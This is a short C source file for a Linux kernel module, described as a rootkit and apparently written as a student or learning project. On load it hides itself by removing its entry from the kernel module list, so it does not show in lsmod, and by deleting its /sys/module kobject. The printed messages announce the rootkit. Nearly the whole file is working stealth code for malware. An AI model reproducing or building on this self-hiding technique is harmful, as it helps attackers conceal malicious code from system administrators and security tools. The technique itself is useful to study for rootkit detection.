#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h> 

/*************** Module description ********************/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Xincheng and Matthew");
MODULE_DESCRIPTION("Rootkit main entry"); 

 
static int lkm_init(void)
{
    //Hide this module from kernel modules(lsmod | grep [module]) 
    list_del_init(&__this_module.list);

    //Hide this module from /sys/module
    kobject_del(&THIS_MODULE->mkobj.kobj);
    printk("Hello world, our rootkit(hide module itself) module successfully loaded\n");
    
    return 0;    
}
 
static void lkm_exit(void)
{
    printk("Hello world, our rootkit module removed\n");
}
 
module_init(lkm_init);
module_exit(lkm_exit);